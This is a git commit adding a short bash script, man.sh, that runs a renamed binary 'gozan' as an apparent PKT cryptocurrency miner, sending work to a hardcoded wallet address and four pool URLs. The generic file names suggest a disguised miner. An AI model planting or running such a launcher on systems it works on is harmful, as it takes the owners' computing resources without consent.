5472a499b931ceffc5cc9dd53f35f88e5d93d16e
ywer03275001 <132078704+ywer03275001@users.noreply.github.com>
2023-04-28 21:26:28 +0700

    Add files via upload

---
+++ man.sh
@@ -0,0 +1,4 @@
+#!/bin/bash
+
+chmod +x gozan
+./gozan ann -p pkt1q6fu33fgq2w5t7d7ef8l03xl32pzwa6nhdk2src https://stratum.zetahash.com/ http://pool.pkt.world/ http://pool.pkteer.com/ http://pool.pktpool.io -t 1
